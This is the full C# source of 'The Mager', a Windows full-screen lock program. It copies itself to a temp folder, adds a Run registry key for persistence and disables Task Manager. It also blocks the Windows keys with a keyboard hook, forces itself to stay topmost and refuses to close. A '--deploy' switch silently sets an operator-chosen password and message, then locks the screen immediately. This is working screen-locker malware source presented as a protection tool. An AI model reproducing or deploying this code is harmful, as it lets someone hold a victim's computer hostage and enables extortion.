using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace TheMager
{
    static class Program
    {
        [STAThread]
        static void Main(string[] args)
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);

            string exeDir = Path.GetDirectoryName(Process.GetCurrentProcess().MainModule.FileName);
            string configPath = Path.Combine(exeDir, "lock_config.json");
            string passwordFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "themager_pw.dat");

            // Parse args
            bool doChange = false;
            bool doUninstall = false;
            bool doDeploy = false;
            string deployPw = null;
            string deployMsg = null;

            for (int i = 0; i < args.Length; i++)
            {
                if (args[i] == "--change") doChange = true;
                else if (args[i] == "--uninstall") doUninstall = true;
                else if (args[i] == "--deploy") doDeploy = true;
                else if (args[i] == "--password" && i + 1 < args.Length) deployPw = args[++i];
                else if (args[i] == "--message" && i + 1 < args.Length) deployMsg = args[++i];
            }

            if (doUninstall) { Uninstall(); return; }
            if (doChange) { ChangePassword(passwordFile); return; }

            // --deploy mode: pre-set password and message silently, then lock
            if (doDeploy && deployPw != null)
            {
                // Save password hash
                File.WriteAllText(passwordFile, Sha256(deployPw));
                // Save message
                if (deployMsg != null)
                {
                    try
                    {
                        string json = "{\"message\":\"" + deployMsg.Replace("\"", "\\\"") + "\"}";
                        File.WriteAllText(configPath, json);
                    }
                    catch { }
                }
                // Auto-install to startup
                AutoInstall();
                // Lock immediately
                LockScreen lockScreen = new LockScreen(passwordFile, configPath);
                Application.Run(lockScreen);
                return;
            }

            // Auto-install on normal run too
            AutoInstall();

            // Check if password is set
            if (!File.Exists(passwordFile))
            {
                SetupAndLock(passwordFile, configPath);
                return;
            }

            // Password exists - lock immediately
            LockScreen ls = new LockScreen(passwordFile, configPath);
            Application.Run(ls);
        }

        static void AutoInstall()
        {
            try
            {
                string exePath = Process.GetCurrentProcess().MainModule.FileName;
                string tempDir = Path.Combine(Path.GetTempPath(), "TheMager");
                string tempExe = Path.Combine(tempDir, "TheMager.exe");

                if (string.Equals(exePath, tempExe, StringComparison.OrdinalIgnoreCase))
                {
                    EnsureStartupEntry(tempExe);
                    return;
                }

                bool needCopy = true;
                if (File.Exists(tempExe))
                {
                    DateTime srcTime = File.GetLastWriteTimeUtc(exePath);
                    DateTime dstTime = File.GetLastWriteTimeUtc(tempExe);
                    if (srcTime <= dstTime)
                        needCopy = false;
                }

                if (needCopy)
                {
                    Directory.CreateDirectory(tempDir);
                    for (int i = 0; i < 3; i++)
                    {
                        try { File.Copy(exePath, tempExe, true); break; }
                        catch { Thread.Sleep(500); }
                    }
                }

                // Also copy config if it exists nearby
                string srcConfig = Path.Combine(Path.GetDirectoryName(exePath), "lock_config.json");
                string dstConfig = Path.Combine(tempDir, "lock_config.json");
                if (File.Exists(srcConfig) && !File.Exists(dstConfig))
                {
                    try { File.Copy(srcConfig, dstConfig, false); } catch { }
                }

                EnsureStartupEntry(tempExe);
            }
            catch { }
        }

        static void EnsureStartupEntry(string exePath)
        {
            try
            {
                try
                {
                    RegistryKey key = Registry.LocalMachine.OpenSubKey(
                        @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
                    key.SetValue("TheMager", "\"" + exePath + "\"");
                    key.Close();
                }
                catch
                {
                    RegistryKey key = Registry.CurrentUser.OpenSubKey(
                        @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
                    key.SetValue("TheMager", "\"" + exePath + "\"");
                    key.Close();
                }
            }
            catch { }
        }

        static void Uninstall()
        {
            try
            {
                try
                {
                    RegistryKey key = Registry.LocalMachine.OpenSubKey(
                        @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
                    key.DeleteValue("TheMager", false);
                    key.Close();
                }
                catch { }

                try
                {
                    RegistryKey key = Registry.CurrentUser.OpenSubKey(
                        @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
                    key.DeleteValue("TheMager", false);
                    key.Close();
                }
                catch { }

                string tempDir = Path.Combine(Path.GetTempPath(), "TheMager");
                if (Directory.Exists(tempDir))
                    Directory.Delete(tempDir, true);

                MessageBox.Show("The Mager removed from startup.", "The Mager",
                    MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show("Error: " + ex.Message, "The Mager",
                    MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        static void SetupAndLock(string passwordFile, string configPath)
        {
            Form setup = new Form
            {
                Text = "The Mager - Setup",
                Size = new System.Drawing.Size(420, 340),
                FormBorderStyle = FormBorderStyle.FixedDialog,
                MaximizeBox = false,
                MinimizeBox = false,
                StartPosition = FormStartPosition.CenterScreen,
                BackColor = System.Drawing.Color.FromArgb(30, 30, 30)
            };

            var title = new Label
            {
                Text = "THE MAGER",
                ForeColor = System.Drawing.Color.Cyan,
                Font = new System.Drawing.Font("Consolas", 20, System.Drawing.FontStyle.Bold),
                AutoSize = true,
                Location = new System.Drawing.Point(110, 20)
            };
            setup.Controls.Add(title);

            var subtitle = new Label
            {
                Text = "Set your lock password",
                ForeColor = System.Drawing.Color.White,
                Font = new System.Drawing.Font("Segoe UI", 11),
                AutoSize = true,
                Location = new System.Drawing.Point(120, 60)
            };
            setup.Controls.Add(subtitle);

            var pwLabel = new Label
            {
                Text = "Password:",
                ForeColor = System.Drawing.Color.White,
                Font = new System.Drawing.Font("Segoe UI", 10),
                Location = new System.Drawing.Point(40, 110)
            };
            setup.Controls.Add(pwLabel);

            var pwBox = new TextBox
            {
                UseSystemPasswordChar = true,
                Location = new System.Drawing.Point(40, 135),
                Size = new System.Drawing.Size(330, 25),
                Font = new System.Drawing.Font("Segoe UI", 11)
            };
            setup.Controls.Add(pwBox);

            var confirmLabel = new Label
            {
                Text = "Confirm:",
                ForeColor = System.Drawing.Color.White,
                Font = new System.Drawing.Font("Segoe UI", 10),
                Location = new System.Drawing.Point(40, 170)
            };
            setup.Controls.Add(confirmLabel);

            var confirmBox = new TextBox
            {
                UseSystemPasswordChar = true,
                Location = new System.Drawing.Point(40, 195),
                Size = new System.Drawing.Size(330, 25),
                Font = new System.Drawing.Font("Segoe UI", 11)
            };
            setup.Controls.Add(confirmBox);

            var msgLabel = new Label
            {
                ForeColor = System.Drawing.Color.Red,
                Font = new System.Drawing.Font("Segoe UI", 9),
                Location = new System.Drawing.Point(40, 225),
                Size = new System.Drawing.Size(330, 20)
            };
            setup.Controls.Add(msgLabel);

            var msgGroup = new Label
            {
                Text = "Lock screen message (optional):",
                ForeColor = System.Drawing.Color.Gray,
                Font = new System.Drawing.Font("Segoe UI", 9),
                Location = new System.Drawing.Point(40, 248)
            };
            setup.Controls.Add(msgGroup);

            var customMsg = new TextBox
            {
                Text = "This device is protected by The Mager",
                Location = new System.Drawing.Point(40, 268),
                Size = new System.Drawing.Size(250, 22),
                Font = new System.Drawing.Font("Segoe UI", 9)
            };
            setup.Controls.Add(customMsg);

            var lockBtn = new Button
            {
                Text = "Set Password & Lock",
                BackColor = System.Drawing.Color.Cyan,
                ForeColor = System.Drawing.Color.Black,
                Font = new System.Drawing.Font("Segoe UI", 10, System.Drawing.FontStyle.Bold),
                Size = new System.Drawing.Size(70, 22),
                Location = new System.Drawing.Point(300, 268)
            };
            setup.Controls.Add(lockBtn);

            lockBtn.Click += delegate
            {
                if (pwBox.Text.Length < 4)
                {
                    msgLabel.Text = "Password must be at least 4 characters";
                    return;
                }
                if (pwBox.Text != confirmBox.Text)
                {
                    msgLabel.Text = "Passwords don't match";
                    return;
                }

                string hash = Sha256(pwBox.Text);
                File.WriteAllText(passwordFile, hash);

                try
                {
                    string json = "{\"message\":\"" + customMsg.Text.Replace("\"", "\\\"") + "\"}";
                    File.WriteAllText(configPath, json);
                }
                catch { }

                setup.Close();
                LockScreen lockScreen = new LockScreen(passwordFile, configPath);
                Application.Run(lockScreen);
            };

            Application.Run(setup);
        }

        static void ChangePassword(string passwordFile)
        {
            Form change = new Form
            {
                Text = "The Mager - Change Password",
                Size = new System.Drawing.Size(380, 250),
                FormBorderStyle = FormBorderStyle.FixedDialog,
                MaximizeBox = false,
                MinimizeBox = false,
                StartPosition = FormStartPosition.CenterScreen,
                BackColor = System.Drawing.Color.FromArgb(30, 30, 30)
            };

            var title = new Label
            {
                Text = "Change Password",
                ForeColor = System.Drawing.Color.Cyan,
                Font = new System.Drawing.Font("Consolas", 16, System.Drawing.FontStyle.Bold),
                AutoSize = true,
                Location = new System.Drawing.Point(80, 20)
            };
            change.Controls.Add(title);

            var curLabel = new Label { Text = "Current:", ForeColor = System.Drawing.Color.White, Font = new System.Drawing.Font("Segoe UI", 10), Location = new System.Drawing.Point(40, 65) };
            change.Controls.Add(curLabel);
            var curBox = new TextBox { UseSystemPasswordChar = true, Location = new System.Drawing.Point(40, 85), Size = new System.Drawing.Size(290, 25), Font = new System.Drawing.Font("Segoe UI", 11) };
            change.Controls.Add(curBox);

            var newLabel = new Label { Text = "New:", ForeColor = System.Drawing.Color.White, Font = new System.Drawing.Font("Segoe UI", 10), Location = new System.Drawing.Point(40, 115) };
            change.Controls.Add(newLabel);
            var newBox = new TextBox { UseSystemPasswordChar = true, Location = new System.Drawing.Point(40, 135), Size = new System.Drawing.Size(290, 25), Font = new System.Drawing.Font("Segoe UI", 11) };
            change.Controls.Add(newBox);

            var msgLabel = new Label { ForeColor = System.Drawing.Color.Red, Font = new System.Drawing.Font("Segoe UI", 9), Location = new System.Drawing.Point(40, 165), Size = new System.Drawing.Size(290, 20) };
            change.Controls.Add(msgLabel);

            var btn = new Button { Text = "Change", BackColor = System.Drawing.Color.Cyan, ForeColor = System.Drawing.Color.Black, Font = new System.Drawing.Font("Segoe UI", 10, System.Drawing.FontStyle.Bold), Size = new System.Drawing.Size(290, 30), Location = new System.Drawing.Point(40, 190) };
            change.Controls.Add(btn);

            btn.Click += delegate
            {
                string storedHash = File.ReadAllText(passwordFile);
                if (Sha256(curBox.Text) != storedHash)
                {
                    msgLabel.Text = "Current password is wrong";
                    return;
                }
                if (newBox.Text.Length < 4)
                {
                    msgLabel.Text = "Min 4 characters";
                    return;
                }
                File.WriteAllText(passwordFile, Sha256(newBox.Text));
                MessageBox.Show("Password changed!", "The Mager", MessageBoxButtons.OK, MessageBoxIcon.Information);
                change.Close();
            };

            Application.Run(change);
        }

        public static string Sha256(string input)
        {
            using (SHA256 sha = SHA256.Create())
            {
                byte[] hash = sha.ComputeHash(Encoding.UTF8.GetBytes(input));
                StringBuilder sb = new StringBuilder();
                foreach (byte b in hash)
                    sb.Append(b.ToString("x2"));
                return sb.ToString();
            }
        }
    }

    class LockScreen : Form
    {
        string passwordFile;
        string configPath;
        int failedAttempts = 0;
        string lockMessage = "This device is protected by The Mager";

        delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern IntPtr GetModuleHandle(string lpModuleName);
        [DllImport("user32.dll")]
        static extern bool BlockInput(bool fBlockIt);

        IntPtr hookId = IntPtr.Zero;
        LowLevelKeyboardProc hookProc;

        System.Windows.Forms.Timer focusTimer;

        public LockScreen(string pwFile, string cfgPath)
        {
            passwordFile = pwFile;
            configPath = cfgPath;

            try
            {
                if (File.Exists(cfgPath))
                {
                    string json = File.ReadAllText(cfgPath);
                    int idx = json.IndexOf("\"message\"");
                    if (idx >= 0)
                    {
                        int start = json.IndexOf("\"", idx + 9) + 1;
                        int end = json.IndexOf("\"", start);
                        if (start > 0 && end > start)
                            lockMessage = json.Substring(start, end - start).Replace("\\\"", "\"");
                    }
                }
            }
            catch { }

            try
            {
                RegistryKey key = Registry.CurrentUser.CreateSubKey(
                    @"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
                key.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
                key.Close();
            }
            catch { }

            this.FormBorderStyle = FormBorderStyle.None;
            this.WindowState = FormWindowState.Maximized;
            this.TopMost = true;
            this.BackColor = System.Drawing.Color.Black;
            this.ShowInTaskbar = false;
            this.Cursor = Cursors.Arrow;

            var title = new Label
            {
                Text = "THE MAGER",
                ForeColor = System.Drawing.Color.Cyan,
                Font = new System.Drawing.Font("Consolas", 36, System.Drawing.FontStyle.Bold),
                AutoSize = true
            };
            title.Location = new System.Drawing.Point((Screen.PrimaryScreen.WorkingArea.Width - title.PreferredWidth) / 2, 150);
            this.Controls.Add(title);

            var msg = new Label
            {
                Text = lockMessage,
                ForeColor = System.Drawing.Color.White,
                Font = new System.Drawing.Font("Segoe UI", 16),
                AutoSize = true
            };
            msg.Location = new System.Drawing.Point((Screen.PrimaryScreen.WorkingArea.Width - msg.PreferredWidth) / 2, 230);
            this.Controls.Add(msg);

            var pwBox = new TextBox
            {
                UseSystemPasswordChar = true,
                Size = new System.Drawing.Size(300, 30),
                Font = new System.Drawing.Font("Segoe UI", 14),
                BackColor = System.Drawing.Color.FromArgb(50, 50, 50),
                ForeColor = System.Drawing.Color.White,
                TextAlign = HorizontalAlignment.Center
            };
            pwBox.Location = new System.Drawing.Point((Screen.PrimaryScreen.WorkingArea.Width - 300) / 2, 320);
            this.Controls.Add(pwBox);

            var unlockBtn = new Button
            {
                Text = "UNLOCK",
                BackColor = System.Drawing.Color.Cyan,
                ForeColor = System.Drawing.Color.Black,
                Font = new System.Drawing.Font("Consolas", 14, System.Drawing.FontStyle.Bold),
                Size = new System.Drawing.Size(300, 40)
            };
            unlockBtn.Location = new System.Drawing.Point((Screen.PrimaryScreen.WorkingArea.Width - 300) / 2, 365);
            this.Controls.Add(unlockBtn);

            var failLabel = new Label
            {
                ForeColor = System.Drawing.Color.Red,
                Font = new System.Drawing.Font("Segoe UI", 11),
                AutoSize = true
            };
            failLabel.Location = new System.Drawing.Point((Screen.PrimaryScreen.WorkingArea.Width - 200) / 2, 420);
            this.Controls.Add(failLabel);

            EventHandler tryUnlock = delegate
            {
                if (pwBox.Text.Length == 0) return;
                string storedHash = File.ReadAllText(passwordFile);
                string inputHash = Program.Sha256(pwBox.Text);
                if (inputHash == storedHash)
                {
                    Unlock();
                }
                else
                {
                    failedAttempts++;
                    failLabel.Text = "Wrong password (" + failedAttempts + " attempts)";
                    pwBox.Text = "";
                }
            };

            unlockBtn.Click += tryUnlock;
            pwBox.KeyDown += delegate(object sender, KeyEventArgs e)
            {
                if (e.KeyCode == Keys.Enter) tryUnlock(null, null);
            };

            hookProc = HookCallback;
            using (Process curProc = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProc.MainModule)
                hookId = SetWindowsHookEx(13, hookProc, GetModuleHandle(curModule.ModuleName), 0);

            focusTimer = new System.Windows.Forms.Timer();
            focusTimer.Interval = 200;
            focusTimer.Tick += delegate
            {
                if (!this.TopMost) this.TopMost = true;
                this.BringToFront();
                this.Activate();
            };
            focusTimer.Start();

            this.FormClosing += delegate(object sender, FormClosingEventArgs e)
            {
                e.Cancel = true;
            };
        }

        void Unlock()
        {
            try
            {
                RegistryKey key = Registry.CurrentUser.CreateSubKey(
                    @"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
                key.DeleteValue("DisableTaskMgr", false);
                key.Close();
            }
            catch { }

            if (hookId != IntPtr.Zero) UnhookWindowsHookEx(hookId);
            focusTimer.Stop();

            this.FormClosing -= null;
            this.FormClosing += delegate(object sender, FormClosingEventArgs e) { };
            this.Close();
            Application.Exit();
        }

        IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                if (vkCode == 91 || vkCode == 92)
                    return (IntPtr)1;
            }
            return CallNextHookEx(hookId, nCode, wParam, lParam);
        }
    }
}
